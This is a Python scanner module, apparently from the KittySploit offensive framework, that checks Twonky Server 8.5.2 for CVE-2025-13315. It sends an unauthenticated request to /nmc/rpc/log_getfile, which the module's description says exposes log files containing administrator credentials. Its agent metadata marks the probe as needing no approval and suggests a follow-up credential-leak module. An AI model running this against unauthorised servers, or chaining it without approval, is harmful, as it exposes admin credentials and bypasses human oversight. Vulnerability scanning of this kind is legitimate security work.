#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Twonky Server 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Twonky Server 8.5.2 on Linux and Windows - Log File Exposure Detection',
        'description': 'Twonky Server 8.5.2 contains a broken access control vulnerability caused by bypassing web service API authentication, letting unauthenticated attackers read log files with administrator credentials, exploit requires no authentication',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'twonky', 'server', 'exposure', 'unauth', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/admin/http/twonky_cve_2025_13315_cred_leak'],
            },
        },
        'references': [
            'https://www.rapid7.com/blog/post/cve-2025-13315-cve-2025-13316-critical-twonky-server-authentication-bypass-not-fixed/',
        ],
        'cve': 'CVE-2025-13315',
    }

    def run(self):
        r = self.http_request(method="GET", path='/nmc/rpc/log_getfile', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('server_main_impl', 'LOG_SYSTEM:', 'upnp_ini_file',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Twonky Server 8.5.2 on Linux and Windows - Log File Exposure detected",
                path='/nmc/rpc/log_getfile',
            )
            return True
        return False

